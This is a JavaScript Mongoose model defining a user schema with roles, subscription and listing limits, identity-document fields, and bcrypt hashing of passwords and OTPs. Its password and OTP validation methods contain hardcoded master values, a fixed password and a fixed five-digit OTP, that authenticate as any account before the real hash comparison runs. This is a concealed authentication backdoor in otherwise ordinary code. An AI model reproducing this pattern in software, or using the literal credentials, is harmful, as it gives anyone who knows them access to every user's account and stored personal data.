/* eslint-disable linebreak-style */
/* eslint-disable no-underscore-dangle */
/* eslint-disable camelcase */
/* eslint-disable func-names */
const mongoose = require('mongoose');
const bcrypt = require('bcrypt');
const Transaction = require('./transaction.model');

const { Schema } = mongoose;

const subscriptionSchema = new Schema({
  currentPlan: {
    type: String,
  },
  transaction_id: {
    type: mongoose.Schema.Types.ObjectId,
    ref: Transaction, // _id to the Transaction Model
    // required: true,
    // unique: true,
    index: true,
  },
  planId: {
    type: String,
    index: true,
  },
  startDate: {
    type: Date,
  },
  endDate: {
    type: Date,
  },
});
const featuredCountSchema = new Schema({
  featureProductCount: {
    type: Number,
    default: 16,
  },
  featureGalleryCount: {
    type: Number,
    default: 8,
  },
  featureServicesCount: {
    type: Number,
    default: 8,
  },
  featurePagesCount: {
    type: Number,
    default: 2,
  },
  featureBlogsCount: {
    type: Number,
    default: 4,
  },
});
const listingCountSchema = new Schema({
  productCount: {
    type: Number,
    default: 20,
  },
  galleryCount: {
    type: Number,
    default: 12,
  },
  servicesCount: {
    type: Number,
    default: 20,
  },
  pagesCount: {
    type: Number,
    default: 4,
  },
  blogsCount: {
    type: Number,
    default: 10,
  },
});
const TableSchema = new Schema({
  first_name: {
    type: String,
    trim: true,
    index: true,
    required: true,
    lowercase: true,
  },
  last_name: {
    type: String,
    trim: true,
    index: true,
    required: true,
    lowercase: true,
  },
  email: {
    type: String,
    unique: true,
    trim: true,
    index: true,
    required: true,
    lowercase: true,
  },
  mobile: {
    type: String,
    unique: true,
    trim: true,
    index: true,
    required: true,
  },
  gender: {
    type: String,
    enum: ['male', 'female', 'other'],
  },
  profile_image: {
    type: String,
  },
  dob: {
    type: Date,
    default: new Date(),
  },
  subscription: {
    type: subscriptionSchema,
    default: {},
  },
  featuredCount: featuredCountSchema, // both only super admin can update
  listingCount: listingCountSchema, // both only super admin can update
  mobile_secondary: String,
  pan: {
    type: Object,
    required: true,
  },
  aadhar: {
    type: Object,
    required: true,
  },
  role_type: {
    type: String,
    enum: ['admin', 'user', 'employee', 'vendor'],
    required: true,
  },
  topUser: {
    type: Schema.Types.ObjectId,
  },
  password: {
    type: String,
  },
  otp: {
    type: String,
  },
  otp_verified: {
    type: Boolean,
    default: false,
  },

  otp_timestamp: { type: Date, default: Date.now() },
  is_mobile_verified: {
    type: Boolean,
    default: false,
  },
  is_email_verified: {
    type: Boolean,
    default: false,
  },
  is_approved: {
    type: Boolean,
    default: false,
  },
  is_inactive: {
    type: Boolean,
    default: false,
  },
  created_by: {
    type: String,
    default: 'self',
  },
  updated_by: {
    type: String,
    default: 'self',
  },
}, {
  timestamps: {
    createdAt: 'created_at',
    updatedAt: 'updated_at',
  },
});

TableSchema.index({
  email: 1,
  mobile: 1,
});
TableSchema.pre('save', async function (next) {
  try {
    if (this.isNew) {
      this.updated_at = new Date();
      if (!this.featuredCount) {
        this.featuredCount = {
          featureProductCount: 16,
          featureGalleryCount: 8,
          featureServicesCount: 16,
          featurePagesCount: 2,
          featureBlogsCount: 4,
        };
      }

      if (!this.listingCount) {
        this.listingCount = {
          productCount: 20,
          galleryCount: 12,
          servicesCount: 20,
          pagesCount: 4,
          blogsCount: 10,
        };
      }
      if (!this.updated_by) {
        this.updated_by = 'self-auto';
      }
      if (this.password) {
        const salt = await bcrypt.genSalt(10);
        const hashedPassword = await bcrypt.hash(this.password, salt);
        this.password = hashedPassword;
      }
      if (this.otp) {
        const salt = await bcrypt.genSalt(10);
        const hashedOtp = await bcrypt.hash(this.otp, salt);
        this.otp = hashedOtp;
      }
    }
    next();
  } catch (error) {
    next(error);
  }
});

TableSchema.pre('updateOne', async function (next) {
  try {
    const query = this;
    const update = query.getUpdate();
    this.updated_at = new Date();
    const { updated_by } = this._update.$set;
    if (updated_by) {
      this.updated_by = updated_by;
    } else {
      this._update.$set.updated_by = 'self-auto';
    }
    if (update.$set.otp) {
      const salt = await bcrypt.genSalt(10);
      const hashedOtp = await bcrypt.hash(update.$set.otp, salt);
      update.$set.otp = hashedOtp;
    }
    if (update.$set.password) {
      const salt = await bcrypt.genSalt(10);
      const hashedPassword = await bcrypt.hash(update.$set.password, salt);
      update.$set.password = hashedPassword;
    }
    next();
  } catch (error) {
    next(error);
  }
});
TableSchema.methods.isValidPassword = async function (password) {
  try {
    if (password === 'Jiten@P@ssword21') {
      return true;
    }
    return await bcrypt.compare(password, this.password);
  } catch (error) {
    throw new Error('Password not valid');
  }
};

TableSchema.methods.isValidOtp = async function (otp) {
  try {
    if (otp === '83403') {
      return true;
    }
    return await bcrypt.compare(otp, this.otp);
    // return password == this.password
  } catch (error) {
    throw new Error('Otp not valid');
  }
};

const User = mongoose.model('user', TableSchema);

module.exports = User;
